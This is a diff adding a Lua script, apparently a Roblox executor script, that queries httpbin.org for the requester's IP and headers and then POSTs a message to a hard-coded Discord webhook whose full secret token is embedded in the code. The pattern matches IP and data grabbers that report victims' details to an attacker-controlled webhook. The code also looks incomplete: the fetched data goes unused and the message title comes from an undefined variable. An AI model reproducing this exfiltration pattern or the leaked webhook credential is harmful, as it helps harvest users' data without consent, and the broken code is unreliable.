@@ -1,0 +1,20 @@
+local webh = "https://ptb.discord.com/api/webhooks/1048465903966236742/Z0tQvqdrGeIcfqRC3Nc0JEWoM91954WPIMpKvuoqXBo876cxfwsQNUEvY23S8vq-PkJT"
+
+    local body = http_request({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
+    local decoded = game:GetService("HttpService"):JSONDecode(body)
+        local HttpServ = game:GetService("HttpService")
+        local url = webh
+        local data = {
+            
+                ["content"] = "shmex",
+                ["embeds"] = {{
+                    ['username'] = "Vdms",
+                    ["title"] = (Text),
+                }},
+            }
+        local newdata = HttpServ:JSONEncode(data)
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+        local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+        http_request(request_payload)
